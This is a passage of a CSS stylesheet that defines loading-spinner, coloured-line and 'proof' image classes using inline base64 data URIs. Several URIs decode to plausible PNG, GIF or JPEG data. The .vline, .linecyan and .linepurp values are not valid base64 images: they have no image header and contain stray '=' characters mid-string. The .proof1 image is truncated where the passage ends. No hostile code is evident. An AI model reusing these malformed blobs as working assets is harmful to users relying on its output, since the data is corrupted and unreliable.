JPdzlYWhIkzsIIBvpGQOmKrlkTJpWUleYgdMtKWXABgaFZEdDk7pkNDWjSNvkgkFdcBNLdV9mDKi0iVZsNBGBpoN29LUjSOqKiorpI0kDzkaUzahuFhVGkc9qRpNMmJ2lrCObjkk5OTEmPVS1ESFf0LkCSTtBNVZfVRJJua2ufVNbX1gyRFlHLj2dSaYRLly9csqikYcLE0nKwNK9WawyztnA+XLqloaOjo2Hx/ByIv+Oio/j85OHSFf2VIFA6twIS5pGaIYpuqiDpKUX1QFCeAwY1ublZVSbACNGY3NoKtnvqtBogyKquA4FqIDCWAIaps4ucnJUlUHvn9BlNTU2OrqE8QMANBAZi4AhlYhJQAwVcHhB0WjvIyDAzM7MAAS88Ldja54NCLj/bTpoBC2BRVhLML8wWVGBjwA5kdZTkFfxFsEkxS7Ox8bMpBwTxswEZfOjSPoGsQCAkJASiPJzQZJnkGkHuggFFNO3B4fMKkYCvOoosr1YEJzII84ZLAQBszdr6ok+qlQAAAABJRU5ErkJggg==") 0 0;
            width: 30px;
            height: 28px;
        }

        .loading {
            background: url("data:image/png;base64,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") 0 0;
            width: 50px;
            height: 50px;
        }

        .vline {
            background: url("data:image/png;base64,8rZ2ulY4fmk3LnZxtJZpgyl7cnM0dXJJQ3AlbHOmnlaDbmRwXm6BuKR11X1h7xRFekgt/0ANO5/CETNJ6Ps6dmLOmmRr/ymB20vGn0CSlnMlbnTWJBRKpcdbmZ/yFTv41wZ9E0Mcnr3J8QtFW3WGiG7gmiXEqWEeAxNU4wpl6S1YfXeG1eJo2TIaBR2N5RsT7P6jxd2a0izR8zmc3biSK1lQosJk8iR/zNyS4=xF2+pfCyHXrG142emil3KxGRrHp33MZjrSniNaanGjop/=oWy0DE/XB/IS/Q2sw/AlBBx8iZKvCCmeCQImjsGh2eO43xpAytyX2s+gfZnv2=GSrFeBEDv6YmrLmVBv/BNLnO7GI1e2tMBNqQq+ytS+z/9Kkr1c6eRQ5RCfoEx1xBavDiNv/vAHdT+F8Fbt1f+CIU1Ej6D2aMW87R4enI6=3vm5DjwibGl34=FBJklNl7O/FQhB6OJF3Q4nsWeN5i3OZRzouHb77BaT32kVdCBV5Qztnn=x2pf0XxehlnPzVh3cd3LTcSSuva8jqD8bn23RqVt93gmZbD3ZsW=ja16O0DaesLLipDrq3rhB2wCTbI4c1bbrX1a4FFo9rSflx2Ko4MacYS7XncoWjGL4EO/r7MP5G2W5FTrt8ZWRBhkAxZzSCNmd+OPiI=gcBuDcs0vl2=CctXjHKmfg8MHuxOrz7q/tBzC6DgwwNxrUVcRnZCtm+qlKdWUmjzLlKk1ZRjDiRK/+bFtOiV=RYRplhA3MVANRakSSYa5Y") 0 0;
            width: 200px;
            height: 5px;
        }

        .linered {
            background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANAAAAAGAQMAAACIDYIFAAAAA1BMVEX/IhyqURNYAAAAC0lEQVR4AWMY9AAAAKIAATBw1mcAAAAASUVORK5CYII=") 0 0;
            width: 50px;
            height: 5px;
        }

        .linecyan {
            background: url("data:image/png;base64,78W8pmEzhVfgc2Zutb9seyB7eT49IGRKa3htZW61UUa=dEVtTK2xwrm6srVo5wNDhEsa+jw7OXvII1FT5MP4Yjm=nV5wueO3zRFBWzZGmjY8IHmBG0BU4QlUbln20f291ViHAT5LZ67t/jFsbGGWnyielmGHWVFq=BFU6sYpsjDUuXVuqAv1=Tqn+BSI40VW//y5wtdV9yn33Tur6wfKJCB+3vpesy6H0vVD6Pu6mJAn0hHXrCByzqqSSDuGz0BGcDkda2vBpVaclTZc14m9YS7KICKx=vhT9hWxDQNjASl2ytnzCTuevOVw1Piu3fT3EAAtg6Ji9LLir5GsDDCDmmK49ULoonLpo3Jv+BJC4K66HEJpu5VU7f2vyuJz3s0c") 0 0;
            width: 50px;
            height: 5px;
        }

        .lineblue {
            background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANAAAAAGAgMAAADPrfjVAAAACVBMVEUAnuIAnuEAneKnSDASAAAAK0lEQVR42mNgwA+YQEQDmCmAIsHCQBxoYCAdMKHaRo4RDA4wBiMD+YCQJwGGiwHuwamyKQAAAABJRU5ErkJggg==") 0 0;
            width: 50px;
            height: 5px;
        }

        .linegreen {
            background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANAAAAAGAQMAAACIDYIFAAAAA1BMVEVXpER1U/mLAAAADElEQVR42mNgGOwAAACiAAElHMCIAAAAAElFTkSuQmCC") 0 0;
            width: 50px;
            height: 5px;
        }

        .linepurp {
            background: url("data:image/png;base64,URujFbpg6bbWnNZhJPEQqDm15MRlleppfIBI29baB7vx4oJWw9KGIQmhNttUWka+uZQNaqNbmOznOVW5RlIe6to9uH1lG5/iRVwv1lD4=dUElt32YTR63NeDucuRjVnjNFRjh6sWvxa0FBQl0oX+48f9xH8oyZ4+IXa5PllSSZ254MyoCPKkUlJQbnuxTHHASlKGB0O/OIDdVJzPPxa3mWEyCyFEUkZqO0yCUFcuDtoe") 0 0;
            width: 50px;
            height: 5px;
        }

        .proof1 {
            background: url("data:image/jpg;base64,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